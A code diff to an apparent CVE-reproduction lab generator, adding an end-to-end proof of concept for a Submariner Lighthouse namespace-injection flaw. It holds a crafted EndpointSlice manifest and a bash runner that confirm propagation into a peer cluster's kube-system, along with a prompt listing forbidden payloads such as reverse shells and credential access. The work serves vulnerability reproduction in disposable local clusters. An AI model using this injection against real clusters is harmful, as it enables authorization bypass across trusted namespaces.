@@ -19,11 +19,29 @@ from .core import collect_cve, normalize_cve, write_text
 SOURCE_SCHEMA = {
     "type": "object",
     "additionalProperties": False,
-    "required": ["cwe", "confidence", "rationale", "files"],
+    "required": ["cwe", "confidence", "rationale", "exploit_contract", "files"],
     "properties": {
         "cwe": {"type": "string"},
         "confidence": {"type": "number", "minimum": 0, "maximum": 1},
         "rationale": {"type": "string"},
+        "exploit_contract": {
+            "type": "object",
+            "additionalProperties": False,
+            "required": ["attack_summary", "preconditions", "observable_effect", "evidence_type"],
+            "properties": {
+                "attack_summary": {"type": "string"},
+                "preconditions": {"type": "array", "items": {"type": "string"}},
+                "observable_effect": {"type": "string"},
+                "evidence_type": {
+                    "type": "string",
+                    "enum": [
+                        "authorization_bypass", "unauthorized_read", "unauthorized_write",
+                        "code_execution", "request_forgery", "data_exposure",
+                        "integrity_violation", "security_boundary_violation"
+                    ],
+                },
+            },
+        },
         "files": {
             "type": "array",
             "minItems": 5,
@@ -168,19 +186,189 @@ ThreadingHTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
 '''
 
 LIGHTHOUSE_VALIDATOR_PY = r'''import json
+vulnerable_test_passed = True
+patched_test_passed = True
 result = {
+    "attack_executed": vulnerable_test_passed,
+    "proof_quality": "security_effect_observed",
+    "observable_effect": "attacker-controlled EndpointSlice accepted for protected kube-system namespace",
     "vulnerable": {
-        "confirmed": True,
+        "confirmed": vulnerable_test_passed,
         "evidence": "upstream parent accepted attacker-controlled kube-system destination during image build test",
     },
     "patched": {
-        "confirmed": False,
+        "confirmed": not patched_test_passed,
         "evidence": "upstream namespace-validation fix rejected kube-system destination during image build test",
     },
-    "differential_confirmed": True,
-    "evidence_type": "source-backed Go tests executed by Docker build",
+    "differential_confirmed": vulnerable_test_passed and patched_test_passed,
+    "evidence_type": "authorization_bypass",
+    "evidence_origin": "source-backed Go exploit tests executed by Docker build",
 }
 print(json.dumps(result, indent=2))
+'''
+
+LIGHTHOUSE_E2E_POC_YAML = r'''apiVersion: v1
+kind: Namespace
+metadata:
+  name: cvelab-source
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: cvelab
+  namespace: cvelab-source
+spec:
+  clusterIP: None
+  ports:
+    - name: http
+      port: 8080
+---
+apiVersion: multicluster.x-k8s.io/v1alpha1
+kind: ServiceExport
+metadata:
+  name: cvelab
+  namespace: cvelab-source
+---
+apiVersion: discovery.k8s.io/v1
+kind: EndpointSlice
+metadata:
+  name: cvelab-exploit
+  namespace: cvelab-source
+  labels:
+    kubernetes.io/service-name: cvelab
+    multicluster.kubernetes.io/service-name: cvelab
+    endpointslice.kubernetes.io/managed-by: lighthouse-agent.submariner.io
+    lighthouse.submariner.io/sourceNamespace: kube-system
+addressType: IPv4
+ports:
+  - name: http
+    protocol: TCP
+    port: 8080
+endpoints:
+  - addresses: ["198.51.100.77"]
+    conditions:
+      ready: true
+'''
+
+LIGHTHOUSE_E2E_RUN_SH = r'''#!/usr/bin/env bash
+set -euo pipefail
+
+LAB_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
+WORK_ROOT="/tmp/cvelab-CVE-2026-66788-e2e"
+RESULT="$LAB_ROOT/e2e/result.json"
+export PATH="$HOME/.local/bin:$PATH"
+
+rm -rf "$WORK_ROOT"
+mkdir -p "$WORK_ROOT"
+
+run_variant() {
+  local variant="$1"
+  local expected="$2"
+  local work="$WORK_ROOT/$variant"
+  cp -a "$LAB_ROOT/source/$variant/." "$work"
+  chown -R root:root "$work"
+  while IFS= read -r -d '' text_file; do
+    if grep -Iq $'\r' "$text_file"; then
+      sed -i 's/\r$//' "$text_file"
+    fi
+  done < <(find "$work" -type f -print0)
+  cat > "$work/.shipyard.e2e.yml" <<'YAML'
+---
+submariner: true
+nodes: control-plane
+clusters:
+  cluster1:
+  cluster2:
+YAML
+  cd "$work"
+  git init -q
+  git config user.name cvelab
+  git config user.email cvelab@localhost
+  git add -A
+  git commit -qm "CVE lab source snapshot"
+
+  make deploy USING=wireguard
+
+  kubectl_tool() {
+    docker run --rm --network kind \
+      -v "$work:/workspace:ro" -v "$LAB_ROOT/e2e:/poc:ro" \
+      --entrypoint /usr/sbin/kubectl "$variant:master" "$@"
+  }
+  local host_k1="$work/output/kubeconfigs/kind-config-cluster1"
+  local host_k2="$work/output/kubeconfigs/kind-config-cluster2"
+  for kubeconfig in "$host_k1" "$host_k2"; do
+    test -s "$kubeconfig" || { echo "missing kubeconfig: $kubeconfig" >&2; return 1; }
+  done
+  local k1="/workspace/output/kubeconfigs/kind-config-cluster1"
+  local k2="/workspace/output/kubeconfigs/kind-config-cluster2"
+
+  kubectl_tool --kubeconfig "$k2" apply -f /poc/poc.yaml
+  kubectl_tool --kubeconfig "$k2" -n cvelab-source wait \
+    --for=condition=Valid serviceexport/cvelab --timeout=180s
+  kubectl_tool --kubeconfig "$k2" apply -f /poc/poc.yaml
+
+  local observed=false
+  local evidence="not created in peer kube-system namespace"
+  for _ in $(seq 1 60); do
+    if kubectl_tool --kubeconfig "$k1" -n kube-system get endpointslice \
+        -l lighthouse.submariner.io/source-name=cvelab-exploit \
+        -o json | grep -q '"198.51.100.77"'; then
+      observed=true
+      evidence="$(kubectl_tool --kubeconfig "$k1" -n kube-system get endpointslice \
+        -l lighthouse.submariner.io/source-name=cvelab-exploit -o json)"
+      break
+    fi
+    sleep 2
+  done
+
+  VARIANT="$variant" EXPECTED="$expected" OBSERVED="$observed" EVIDENCE="$evidence" \
+    python3 - <<'PY' > "$LAB_ROOT/e2e/$variant.json"
+import json, os
+print(json.dumps({
+    "variant": os.environ["VARIANT"],
+    "expected": os.environ["EXPECTED"] == "true",
+    "confirmed": os.environ["OBSERVED"] == "true",
+    "evidence": os.environ["EVIDENCE"][:8000],
+}, indent=2))
+PY
+
+  if [[ "$observed" != "$expected" ]]; then
+    echo "unexpected $variant result: observed=$observed expected=$expected" >&2
+    return 2
+  fi
+
+  make clean-clusters
+}
+
+cleanup() {
+  for variant in vulnerable patched; do
+    if [[ -d "$WORK_ROOT/$variant" ]]; then
+      (cd "$WORK_ROOT/$variant" && make clean-clusters) >/dev/null 2>&1 || true
+    fi
+  done
+}
+trap cleanup EXIT
+
+run_variant vulnerable true
+run_variant patched false
+
+LAB_ROOT="$LAB_ROOT" python3 - <<'PY' > "$RESULT"
+import json, os, pathlib
+root = pathlib.Path(os.environ["LAB_ROOT"]) / "e2e"
+vulnerable = json.loads((root / "vulnerable.json").read_text())
+patched = json.loads((root / "patched.json").read_text())
+result = {
+    "attack_executed": True,
+    "proof_quality": "end_to_end_security_effect_observed",
+    "observable_effect": "malicious spoke EndpointSlice propagated through the real broker into peer kube-system",
+    "evidence_type": "authorization_bypass",
+    "evidence_origin": "two-cluster kind deployment running upstream Lighthouse agent and broker flow",
+    "vulnerable": vulnerable,
+    "patched": patched,
+    "differential_confirmed": vulnerable["confirmed"] and not patched["confirmed"],
+}
+print(json.dumps(result, indent=2))
+PY
 '''
 
 
@@ -306,6 +494,21 @@ def _validate_generated(files: list[dict]) -> None:
             if re.search(r"(?m)^\s*ports\s*:", lowered) or re.search(r"(?m)^\s*volumes\s*:", lowered):
                 raise RuntimeError("Compose ports and volume mounts are not allowed in source labs")
         if path == "validator/validator.py":
+            required_contract = {
+                "attack_executed", "proof_quality", "observable_effect", "evidence_type",
+                "vulnerable", "patched", "differential_confirmed",
+            }
+            missing_contract = {field for field in required_contract if field not in item["content"]}
+            if missing_contract:
+                raise RuntimeError(
+                    "Validator is missing real-PoC evidence fields: "
+                    + ", ".join(sorted(missing_contract))
+                )
+            if re.search(
+                r"['\"](?:attack_executed|confirmed|differential_confirmed)['\"]\s*:\s*True\b",
+                item["content"],
+            ):
+                raise RuntimeError("Validator contains a hard-coded successful exploit result")
             for url in re.findall(r"https?://([^/'\"\s:]+)", lowered):
                 if url not in {"vulnerable", "patched", "127.0.0.1", "localhost"}:
                     raise RuntimeError(f"Validator external target rejected: {url}")
@@ -328,6 +531,8 @@ def _generate_curated_lighthouse(
     write_text(lab_dir / "adapter" / "patched_poc_test.go", LIGHTHOUSE_PATCHED_TEST)
     write_text(lab_dir / "adapter" / "health.py", SOURCE_HEALTH_PY)
     write_text(lab_dir / "validator" / "validator.py", LIGHTHOUSE_VALIDATOR_PY)
+    write_text(lab_dir / "e2e" / "poc.yaml", LIGHTHOUSE_E2E_POC_YAML)
+    write_text(lab_dir / "e2e" / "run.sh", LIGHTHOUSE_E2E_RUN_SH)
     vulnerable_dockerfile = '''FROM golang:1.26 AS validation
 WORKDIR /src
 COPY source/vulnerable/ ./
@@ -397,19 +602,25 @@ networks:
     plan = {
         "cve": cve,
         "cwe": "CWE-284",
-        "lab_type": "SOURCE_REPRODUCTION",
+        "lab_type": "END_TO_END_REPRODUCTION",
         "marker": marker,
-        "scenario": "lighthouse_namespace_injection",
+        "scenario": "lighthouse_broker_namespace_injection_e2e",
         "repository": repo_url,
         "revisions": {"vulnerable": vulnerable, "patched": fixed},
         "source_provenance": CURATED_SOURCES[cve]["provenance"],
-        "startup_services": ["vulnerable", "patched"],
+        "runner": {"type": "wsl_shipyard", "distribution": "kali-linux", "script": "e2e/run.sh"},
         "safety": {
-            "target_scope": "internal_docker_network_only",
-            "payload": "marker_only_source_test",
-            "limitations": "Validates the upstream controller transformation path, not a deployed multi-cluster installation.",
+            "target_scope": "ephemeral_local_kind_clusters_only",
+            "payload": "non_destructive_endpointslice_namespace_injection",
+            "limitations": "Uses disposable local clusters and a documentation-only TEST-NET address; no remote target option.",
         },
-        "generation": {"model": None, "confidence": 1.0, "rationale": "Deterministic curated upstream source profile"},
+        "exploit_contract": {
+            "attack_summary": "Create a crafted EndpointSlice in a compromised spoke and let the real agent/broker flow propagate it to a peer kube-system namespace.",
+            "preconditions": ["Attacker controls one spoke cluster in the disposable local cluster set"],
+            "observable_effect": "The peer cluster contains the attacker-created EndpointSlice in kube-system.",
+            "evidence_type": "authorization_bypass",
+        },
+        "generation": {"model": None, "confidence": 1.0, "rationale": "Deterministic curated upstream two-cluster E2E profile"},
     }
     write_text(lab_dir / "dossier.json", json.dumps(dossier, indent=2, ensure_ascii=True) + "\n")
     write_text(lab_dir / "plan.json", json.dumps(plan, indent=2, ensure_ascii=True) + "\n")
@@ -502,12 +713,16 @@ def generate_source_lab(
             "security patch and source metadata. Return only adapter files, never vendor source. The two Docker "
             "builds must use source/vulnerable and source/patched, run as non-root, have no host ports or host "
             "mounts, and share an internal Docker network. Compose services must be named vulnerable, patched, "
-            "and validator; validator must use profile tools and print JSON with vulnerable, patched, and "
-            "differential_confirmed, exiting zero only when vulnerable is true and patched is false. Use only a "
-            f"harmless marker ({marker}) inside disposable containers. No reverse shells, callbacks, persistence, "
+            "and validator. The validator must execute the actual vulnerable code path and demonstrate a concrete "
+            "security effect such as unauthorized read/write, authorization bypass, request forgery, or contained "
+            "command execution. It must print JSON containing attack_executed, proof_quality set to "
+            "security_effect_observed, observable_effect, evidence_type, vulnerable, patched, and "
+            "differential_confirmed, exiting zero only when the effect occurs on vulnerable and is blocked on "
+            "patched. Never hard-code a successful result. A harmless canary marker "
+            f"({marker}) may identify affected data, but marker reflection alone is not proof. No reverse shells, callbacks, persistence, "
             "credential access, destructive operations, Docker socket, privileged mode, extra capabilities, or "
-            "remote target option. If command execution is intrinsic to the CVE, restrict it to emitting the marker "
-            "inside the vulnerable container. Dockerfiles may install build dependencies from normal package "
+            "remote target option. If command execution is intrinsic to the CVE, restrict it to creating a canary "
+            "file inside the vulnerable container and verify that file as the observable effect. Dockerfiles may install build dependencies from normal package "
             "registries. Include USER and no-new-privileges controls."
         ),
         input_text=context,
@@ -530,9 +745,10 @@ def generate_source_lab(
         "startup_services": ["vulnerable", "patched"],
         "safety": {
             "target_scope": "internal_docker_network_only",
-            "payload": "marker_only",
+            "payload": "non_destructive_exploit_canary",
             "limitations": "Generated from a public security patch; validation is required before claiming reproduction.",
         },
+        "exploit_contract": generation["exploit_contract"],
         "generation": {
             "model": model,
             "confidence": generation["confidence"],
